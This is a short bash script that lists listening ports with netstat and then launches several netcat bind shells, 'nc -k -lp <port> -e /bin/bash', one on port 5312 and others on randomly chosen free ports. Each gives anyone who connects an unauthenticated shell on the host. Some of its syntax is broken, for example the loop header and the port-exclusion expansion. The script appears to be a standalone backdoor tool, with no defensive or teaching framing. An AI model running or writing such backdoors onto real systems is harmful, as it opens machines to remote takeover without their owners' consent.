# !/bin/bash

ports=($(netstat -tnl | awk -F ' ' '{print $4}' | awk 'NR>2 {print}' | awk -F ':' '{print $2}' | awk 'length >2 {print}'))
sh -c 'nc -k -v -lp 5312 -e /bin/bash 1> nc_out &'

for i in seq {1..10}
do
    ports=($(netstat -tnl | awk -F ' ' '{print $4}' | awk 'NR>2 {print}' | awk -F ':' '{print $2}' | awk 'length >2 {print}'))
    port=$(shuf -n 1 <(seq 1025 1 49151 | grep -Fxv -e{ports}))
    sh -c 'nc -k -v -lp '"$port"' -e /bin/bash 1> nc_out &'
    echo "Opening port $port"
done
